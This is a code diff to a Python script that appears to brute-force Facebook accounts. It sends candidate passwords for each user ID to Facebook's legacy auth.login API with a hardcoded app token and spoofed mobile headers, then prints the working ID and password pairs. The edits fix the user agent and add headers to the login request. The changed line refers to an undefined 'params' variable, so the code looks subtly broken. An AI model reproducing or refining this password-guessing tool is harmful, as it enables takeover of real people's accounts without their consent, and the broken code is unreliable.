@@ -32,7 +32,7 @@ try: import requests as req
 except ModuleNotFoundError: os.system("python -m pip install requests");restart()
 try: from bs4 import BeautifulSoup as parser
 except ModuleNotFoundError: os.system("python -m pip install bs4");restart()
-user_agent = random.choice(["Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"])
+user_agent = 'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501'
 runtah=["lib/__pycache__"]
 try:
 	hapus(runtah[0])
@@ -747,7 +747,7 @@ class ngewe:
 		for pw in _yan_:
 			try: os.mkdir('results')
 			except: pass
-			user_agent = random.choice(["Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"])
+			user_agent = 'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501'
 			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                		'x-fb-net-hni': str(random.randint(20000, 40000)), 
                		'x-fb-connection-quality': 'EXCELLENT', 
@@ -758,7 +758,7 @@ class ngewe:
 			ses=req.Session()
 			api="https://b-api.facebook.com/method/auth.login"
 			param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
-			send=ses.get(api,params=param)
+			send=ses.get(api, params=params, headers=headers_)
 			if "session_key" in send.text and "EAAA" in send.text:
 				ok+=1
 				print(f"\r{H}Berhasil                \n{N}ID {M}:{H} {user}                \n{N}PW FB {M}:{H} {pw}{N}                \n",end="")
